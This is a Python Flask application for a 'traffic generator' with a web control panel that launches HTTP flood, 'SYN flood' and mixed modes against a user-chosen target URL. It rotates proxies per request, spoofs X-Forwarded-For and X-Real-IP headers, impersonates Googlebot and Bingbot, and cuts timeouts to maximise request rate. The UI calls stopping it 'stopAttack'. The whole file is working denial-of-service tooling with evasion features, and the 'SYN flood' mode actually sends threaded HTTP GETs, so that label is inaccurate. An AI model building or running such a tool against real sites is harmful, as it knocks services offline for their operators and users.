# app.py (Optimized High-PPS Version)
"""
Optimized Traffic Generator
- Per-request proxy rotation
- Ultra-low timeout for high PPS
- HTTP Flood, Normal, SYN Flood, Mixed
- Web UI
"""

import threading
import time
import random
import requests
from flask import Flask, jsonify, request, Response
from flask_cors import CORS

# =======================================================
# LOAD PROXIES
# =======================================================

def load_proxies(file_path="proxies.txt"):
    proxies = []
    try:
        with open(file_path, "r") as f:
            for line in f:
                line = line.strip()
                if line and not line.startswith("#"):
                    proxies.append(line)
        print(f"[PROXY] Loaded {len(proxies)} proxies.")
    except Exception as e:
        print("[PROXY] Failed to load proxies.txt:", e)
    return proxies

PROXY_LIST = load_proxies()

# =======================================================
# RANDOM HELPERS
# =======================================================

def random_geo_ip():
    prefixes = ["102.", "41.", "103.", "110.", "185.", "145.", "66.", "104.", "179.", "138.", "203.", "14.", "45."]
    prefix = random.choice(prefixes)
    return prefix + ".".join(str(random.randint(0, 255)) for _ in range(3))

USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/122 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 13.5) Firefox/121.0",
    "Mozilla/5.0 (Linux; Android 10) Chrome/110 Mobile Safari/537.36",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 16_2) Safari/604.1",
    "Mozilla/5.0 (compatible; Googlebot/2.1)",
    "Mozilla/5.0 (compatible; Bingbot/2.0)",
    "curl/8.0.1"
]

URL_PATHS = [
    "/", "/home", "/index", "/login", "/products", "/api/data",
    "/account", "/about", "/contact", "/dashboard", "/search?q=test", "/img/logo.png"
]

def random_headers():
    return {
        "User-Agent": random.choice(USER_AGENTS),
        "X-Forwarded-For": random_geo_ip(),
        "X-Real-IP": random_geo_ip(),
        "Accept": random.choice(["*/*", "text/html", "application/json"]),
        "Accept-Language": random.choice(["en-US", "hi-IN,hi;q=0.9", "fr-FR,fr;q=0.8"]),
        "Accept-Encoding": random.choice(["gzip", "deflate", "br"]),
        "Cache-Control": random.choice(["no-cache", "max-age=0"])
    }

# =======================================================
# TRAFFIC ENGINE (OPTIMIZED)
# =======================================================

class TrafficGenerator:
    def __init__(self, target_url="http://localhost:8000"):
        self.target_url = target_url
        self.running = False
        self.sent = 0
        self._lock = threading.Lock()
        self._worker = None
        self.scenario = None
        self.last_started_at = None
        self.last_finished_at = None

    def _inc(self):
        with self._lock:
            self.sent += 1

    def _send_request(self, session):
        url = self.target_url + random.choice(URL_PATHS)

        # FAST: per-request proxy rotation
        proxy = None
        if PROXY_LIST:
            p = random.choice(PROXY_LIST)
            proxy = {"http": p, "https": p}

        try:
            requests.get(
                url,
                headers=random_headers(),
                timeout=0.6,                 # ultra-low timeout (MAJOR PPS BOOST)
                proxies=proxy,
                verify=False,
                allow_redirects=False
            )
        except:
            pass

        self._inc()

    # --------------------- NORMAL ---------------------
    def generate_normal(self, duration=30, rate=5):
        self.running = True
        self.sent = 0
        self.scenario = "normal"
        self.last_started_at = time.time()

        session = requests.Session()
        end = time.time() + duration
        sleep_time = 1 / max(1, rate)

        while time.time() < end and self.running:
            self._send_request(session)
            time.sleep(sleep_time)

        self.running = False
        self.last_finished_at = time.time()

    # --------------------- HTTP FLOOD ---------------------
    def generate_http_flood(self, duration=20, rate=1000, threads_count=30):
        self.running = True
        self.sent = 0
        self.scenario = "http_flood"
        self.last_started_at = time.time()

        end = time.time() + duration
        per_thread = max(1, rate // threads_count)
        sleep_time = 1 / per_thread

        def worker():
            session = requests.Session()
            while time.time() < end and self.running:
                self._send_request(session)
                time.sleep(sleep_time)

        threads = []
        for _ in range(threads_count):
            t = threading.Thread(target=worker, daemon=True)
            t.start()
            threads.append(t)

        while time.time() < end and self.running:
            time.sleep(0.01)

        self.running = False
        for t in threads:
            t.join(timeout=0.1)

        self.last_finished_at = time.time()

    # --------------------- SYN FLOOD ---------------------
    def generate_syn_flood(self, duration=20, bursts=50):
        self.running = True
        self.sent = 0
        self.scenario = "syn_flood"
        self.last_started_at = time.time()

        session = requests.Session()

        for _ in range(bursts):
            if not self.running:
                break

            for _ in range(200):  # 200 threads per burst
                threading.Thread(target=self._send_request, args=(session,), daemon=True).start()

            time.sleep(0.01)

        self.running = False
        self.last_finished_at = time.time()

    # =======================================================
    # START / STOP / STATUS
    # =======================================================

    def start_scenario(self, name, **kw):
        if self._worker and self._worker.is_alive():
            raise RuntimeError("Scenario already running")

        if "target_url" in kw:
            self.target_url = kw.pop("target_url").rstrip("/")

        if name == "normal":
            allowed = {"duration", "rate"}
            params = {k: kw[k] for k in allowed if k in kw}
            fn = lambda: self.generate_normal(**params)

        elif name == "http_flood":
            allowed = {"duration", "rate", "threads_count"}
            params = {k: kw[k] for k in allowed if k in kw}
            fn = lambda: self.generate_http_flood(**params)

        elif name == "syn_flood":
            allowed = {"duration", "bursts"}
            params = {k: kw[k] for k in kw}
            fn = lambda: self.generate_syn_flood(**params)

        elif name == "mixed":
            def mixed():
                self.generate_normal(duration=10, rate=5)
                if self.running:
                    self.generate_http_flood(duration=20, rate=kw.get("rate", 1000))
            fn = mixed

        else:
            raise ValueError("Invalid scenario")

        self._worker = threading.Thread(target=fn, daemon=True)
        self._worker.start()

    def stop(self):
        self.running = False
        if self._worker:
            self._worker.join(timeout=1)

    def status(self):
        return {
            "running": self.running,
            "sent": self.sent,
            "scenario": self.scenario,
            "target_url": self.target_url,
            "last_started_at": self.last_started_at,
            "last_finished_at": self.last_finished_at
        }


# =======================================================
# FLASK SERVER
# =======================================================

app = Flask(__name__)
CORS(app)
GEN = TrafficGenerator()

@app.route("/api/start", methods=["POST"])
def api_start():
    data = request.get_json(force=True)
    GEN.start_scenario(
        data.get("scenario"),
        target_url=data.get("target_url"),
        duration=int(data.get("duration", 30)),
        rate=int(data.get("rate", 1000)),
        threads_count=int(data.get("threads_count", 30)),
        bursts=int(data.get("bursts", 50))
    )
    return jsonify({"status": "started"})

@app.route("/api/stop", methods=["POST"])
def api_stop():
    GEN.stop()
    return jsonify({"status": "stopped"})

@app.route("/api/status")
def api_status():
    return jsonify(GEN.status())


# =======================================================
# SIMPLE UI
# =======================================================

HTML_PAGE = """
<!doctype html>
<html>
<head>
<title>Traffic Loader</title>
<style>
body{font-family:Arial;background:#eee;padding:20px;}
input{padding:8px;width:260px;}
button{padding:10px 20px;margin:4px;}
pre{background:white;padding:15px;border-radius:6px;}
</style>
</head>
<body>

<h2>Traffic Loader Control Panel</h2>

<label>Target URL:</label><br>
<input id="target" value="http://localhost:8000"><br><br>

<label>Duration:</label><br>
<input id="duration" value="30"><br><br>

<label>Rate:</label><br>
<input id="rate" value="1000"><br><br>

<label>Threads:</label><br>
<input id="threads" value="30"><br><br>

<button onclick="start('normal')">Normal</button>
<button onclick="start('http_flood')" style="background:#ff6961">HTTP Flood</button>
<button onclick="start('syn_flood')" style="background:#ffd500">SYN Flood</button>
<button onclick="start('mixed')" style="background:#9999ff">Mixed</button>
<button onclick="stopAttack()" style="background:black;color:white">STOP</button>

<h3>Status</h3>
<pre id="status">Loading...</pre>

<script>
async function start(type){
    let payload = {
        scenario:type,
        target_url:document.getElementById("target").value,
        duration:parseInt(document.getElementById("duration").value),
        rate:parseInt(document.getElementById("rate").value),
        threads_count:parseInt(document.getElementById("threads").value)
    };
    await fetch("/api/start", {
        method:"POST",
        headers:{"Content-Type":"application/json"},
        body:JSON.stringify(payload)
    });
}

async function stopAttack(){
    await fetch("/api/stop",{method:"POST"});
}

async function refresh(){
    let r = await fetch("/api/status");
    document.getElementById("status").textContent =
        JSON.stringify(await r.json(),null,2);
}

setInterval(refresh,1500);
refresh();
</script>

</body>
</html>
"""

@app.route("/")
def home():
    return Response(HTML_PAGE, mimetype="text/html")

# =======================================================
# RUN
# =======================================================

if __name__ == "__main__":
    print("Running on http://0.0.0.0:5001")
    app.run(host="0.0.0.0", port=5001, threaded=True)
